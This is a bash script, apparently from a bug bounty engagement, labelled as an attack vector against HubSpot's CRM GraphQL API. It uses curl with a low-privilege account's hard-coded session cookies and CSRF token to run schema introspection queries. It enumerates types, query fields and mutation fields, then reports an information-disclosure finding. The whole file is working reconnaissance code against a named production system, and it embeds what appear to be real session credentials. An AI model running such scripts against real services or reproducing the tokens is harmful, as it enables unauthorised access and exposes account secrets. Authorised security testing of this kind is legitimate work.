#!/bin/bash

# ATTACK VECTOR 6: Schema Access Comparison
# Test if LOW-PRIV account can access full GraphQL schema

echo "=========================================="
echo "TEST 4: SCHEMA INTROSPECTION COMPARISON"
echo "=========================================="
echo ""

LOW_PRIV_CSRF="AAccUfsDRYCkgSltHEk7ZtBbPyQe7NH1IYrEoSHvQXAIMGRSU-P-zSR3iPmVMa5RDh4xJPvp1zOmuQN6_9nPVbs1Yu7sFQlY2g"
LOW_PRIV_COOKIES='__hs_cookie_cat_pref=1:true_2:true_3:true; hubspotutk=61540ed14959970838d32bf890933b17; FPID=FPID2.2.aoifmDM9VHjP%2B0DNcWTT94YC%2FEDGX%2BQUKaCl%2Fjdgdtg%3D.1750377867; csrf.app=AAccUfsDRYCkgSltHEk7ZtBbPyQe7NH1IYrEoSHvQXAIMGRSU-P-zSR3iPmVMa5RDh4xJPvp1zOmuQN6_9nPVbs1Yu7sFQlY2g; hubspotapi-prefs=0; hs_c2l=GM2U_VYiGQAQstEnImf9GGYYEuXCtIZHai-lwv2vJf8; hs_login_email=buttercup_ck@bugcrowdninja.com; _conv_v=vi%3A1*sc%3A1*cs%3A1760824014*fs%3A1760824014*pv%3A1*exp%3A%7B100330256.%7Bv.1003131869-g.%7B%7D%7D-100347543.%7Bv.1003176559-g.%7B%7D%7D%7D*seg%3A%7B10031564.1-10034364.1-10034366.1%7D; __hstc=20629287.61540ed14959970838d32bf890933b17.1760824016750.1760824016750.1760824016750.1; _gcl_au=1.1.36100814.1760824017; hs_login_metadata=%7B%22ungatedForLoginV4%22%3Afalse%2C%22showABTestVariant%22%3Afalse%2C%22isMobileLogin%22%3Afalse%7D; NPS_e579c260_last_seen=1760824080763; __cf_bm=8UxLqm3m3CBZBLsGVFXSs2A2_NQmk9BqiSK08hsWM98-1761191378-1.0.1.1-BasB9TIWZMPBwvO8XYAgRxjDyLw8rkWV8MBLN17klinB67etB_3_3fWtGzMem..S6EJnWPB4x3NMQKoyl8IC0FUk_TSDrRifP8cLyP7dM1c; _cfuvid=Y57YVmwyIAFU4lI7ubETx_KL3sDsvrHH9isaxX0USqg-1761191378625-0.0.1.1-604800000; laboratory-anonymous-id=anonce9212bda500075fdfe730acd570; hubspotapi-strict=AAccUfuFeedE2-1FFB3v79Mc_RnGkfLDLYRK-CpUmuun9je7dKK72c3PiFXjfAArjHE1Al7l8-YN8BEx7pblAFWo8AVj6XoDqQ; NPS_61a7bd63_last_seen=1761191510117; hubspotapi=AAccUfugLaqmzIaprwdkqKgegq8ME3jVvm16x8BxxBjR4nmxYdFsQKsrWijty2ngFXagqoNJN5CSistt_p-fTvHCRfV2o8nJ-Y3f3oZHqY4oVy3Oh4UfpcC2McAm7whA9tgkcE4HSEOhkBkMg5KHBneQXkcAVUqt0h05bfYqGjLg8NZ6icBnNJxq1CdzjaZKKTfMPFJJulbPhy3skELIO1_SwRTiln36NhIza_UdWYd9tOwupnsZ6YaeJdO7BMh2kqVo9B0mHQYAGuR1iX_o49lCWDauqBvB0osljr2MO0kzPhigPrIkUjq88X_C3M_Keu-5SGr-d9kaIT4O6cvY9Gmga-0joZ3T3tQKiOJNcPDDUor0drSpPlgXTLKzUT9svA6bbcr1TQ_PQ2exsxhiqxCzqqJHlfxQSPeyI7hTsyfJx37X2wPDAUsh8Vuv13MsPAwnB7cMFJbZkPYludRWfNJUqUOJgGn_fVDi7HJJm_NiPjKWDIBTATlS95fBHrHZotytcsbk-h9LSU245O0sGwAJmngY7Yt4vhA9CkQdQ_oi1NoG1vvcxqUcAy4Gd-duov9s_pP9FGOvOiZyVlJIH2kTbZO7_O8WEpXM571Ohu9IIJ5sDGL-oLWQUI7Q9oyQ7sqA7BaVN7g2VVOoYuZ0ECLQgG3KtDHSCt5F59MTRUmMjHftAlSqbYtNLJ0cN3V5xKE7uWB9qkXyLBD7VYpXIrAu6g6jMZUgpnbU1DERwvmd-4P3ns7iNRHjPZZi3QNWZmZoIX60l_UF1iNbUBaJ01ho3K83xR02pJ3uNJILKoCLPC5aAwplyZHtujuHYNRtrCUTY5lZZTLC_abbU1HPSf1WHps6o8-nrCXkkYJ0-lMqMF8u5YbPa3Vvo6u2-0RtBch9ERN7zV2xqT3a7wUWb9fpNVNW_ZlRriSbbfnVwwljsSfhMsWGel0g7GOgr5SKHgAft6_Fk8ANRHX8khpDe4ev0p5aKrVxySMvAvwyNxgdxHKVw8psM9ZcLnj298S2U7dA-ho1-dlDGug3EjjnAkXbUH2yCUQYpEm5LHmjJWQXq3GT0oaVrLU9_W0xY7trt8YFHB0i7fA70se2ogXGs2kJ8ztTSPQqn756JvNgZC0Nu7sEN7szwVYXgirvPk1yT2QDN3alCm_0sukH7roySutWRJ_nrrHBXqGOHzusFuxngkO_xo-Rk4bfObCEAqzw5qELlUB-zWZdfB5vOBnlCocDJFoJjBoPu2IJ8V_P_6xzfawkRIHWgAqDK1FLsRgfNghQ6h4S5POV_3SQu4vFsGxD9bInUAPHOCG6SWvK89weXLPRBpxg4wXnmcodw0mxZEZ39RqMJTfAwTzfWVdPp2M63FRwppE02WjBdtbscu24SJmsA5pMsqaQN4yg2ujZZ_ktGnYbb5h5m90fk5nMlpBeUAir5QXel06xS9QA8Q7K_o0IfbLJPfM; hubspotapi-csrf=AAccUfsDRYCkgSltHEk7ZtBbPyQe7NH1IYrEoSHvQXAIMGRSU-P-zSR3iPmVMa5RDh4xJPvp1zOmuQN6_9nPVbs1Yu7sFQlY2g'

echo "TEST 4A: Basic schema metadata"
echo ""

curl -k -s \
  'https://app-na2.hubspot.com/api/graphql/crm?portalId=242862774&clienttimeout=14000&hs_static_app=object-builder-ui&hs_static_app_version=1.51882' \
  -X POST \
  -H "content-type: application/json" \
  -H "X-HubSpot-CSRF-hubspotapi: ${LOW_PRIV_CSRF}" \
  -H "Cookie: ${LOW_PRIV_COOKIES}" \
  --data-binary '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}' \
  | jq '.'

echo ""
echo ""
echo "TEST 4B: Enumerate all types"
echo ""

curl -k -s \
  'https://app-na2.hubspot.com/api/graphql/crm?portalId=242862774&clienttimeout=14000&hs_static_app=object-builder-ui&hs_static_app_version=1.51882' \
  -X POST \
  -H "content-type: application/json" \
  -H "X-HubSpot-CSRF-hubspotapi: ${LOW_PRIV_CSRF}" \
  -H "Cookie: ${LOW_PRIV_COOKIES}" \
  --data-binary '{"query":"{ __schema { types { name kind } } }"}' \
  > /tmp/lowpriv_schema_types.json

TYPE_COUNT=$(jq -r '.data.__schema.types | length' /tmp/lowpriv_schema_types.json 2>/dev/null)

echo "Total types accessible: ${TYPE_COUNT}"
echo ""
echo "Sample types (first 20):"
jq -r '.data.__schema.types[0:20] | .[] | "\(.name) (\(.kind))"' /tmp/lowpriv_schema_types.json 2>/dev/null

echo ""
echo ""
echo "TEST 4C: Check Query type fields"
echo ""

curl -k -s \
  'https://app-na2.hubspot.com/api/graphql/crm?portalId=242862774&clienttimeout=14000&hs_static_app=object-builder-ui&hs_static_app_version=1.51882' \
  -X POST \
  -H "content-type: application/json" \
  -H "X-HubSpot-CSRF-hubspotapi: ${LOW_PRIV_CSRF}" \
  -H "Cookie: ${LOW_PRIV_COOKIES}" \
  --data-binary '{"query":"{ __type(name: \"Query\") { fields { name description } } }"}' \
  > /tmp/lowpriv_query_fields.json

QUERY_FIELD_COUNT=$(jq -r '.data.__type.fields | length' /tmp/lowpriv_query_fields.json 2>/dev/null)

echo "Total query fields accessible: ${QUERY_FIELD_COUNT}"
echo ""
echo "Query fields (first 20):"
jq -r '.data.__type.fields[0:20] | .[] | .name' /tmp/lowpriv_query_fields.json 2>/dev/null

echo ""
echo ""
echo "TEST 4D: Check Mutation type fields"
echo ""

curl -k -s \
  'https://app-na2.hubspot.com/api/graphql/crm?portalId=242862774&clienttimeout=14000&hs_static_app=object-builder-ui&hs_static_app_version=1.51882' \
  -X POST \
  -H "content-type: application/json" \
  -H "X-HubSpot-CSRF-hubspotapi: ${LOW_PRIV_CSRF}" \
  -H "Cookie: ${LOW_PRIV_COOKIES}" \
  --data-binary '{"query":"{ __type(name: \"Mutation\") { fields { name description } } }"}' \
  > /tmp/lowpriv_mutation_fields.json

MUTATION_FIELD_COUNT=$(jq -r '.data.__type.fields | length' /tmp/lowpriv_mutation_fields.json 2>/dev/null)

echo "Total mutation fields accessible: ${MUTATION_FIELD_COUNT}"
echo ""
echo "Mutation fields (first 20):"
jq -r '.data.__type.fields[0:20] | .[] | .name' /tmp/lowpriv_mutation_fields.json 2>/dev/null

echo ""
echo ""
echo "=========================================="
echo "SCHEMA INTROSPECTION SUMMARY"
echo "=========================================="
echo "Total Types: ${TYPE_COUNT}"
echo "Query Fields: ${QUERY_FIELD_COUNT}"
echo "Mutation Fields: ${MUTATION_FIELD_COUNT}"
echo ""

if [ "$TYPE_COUNT" -gt "500" ]; then
    echo "FINDING: Full schema introspection enabled for LOW-PRIV account"
    echo "SEVERITY: MEDIUM - Information disclosure"
else
    echo "Schema access may be restricted"
fi
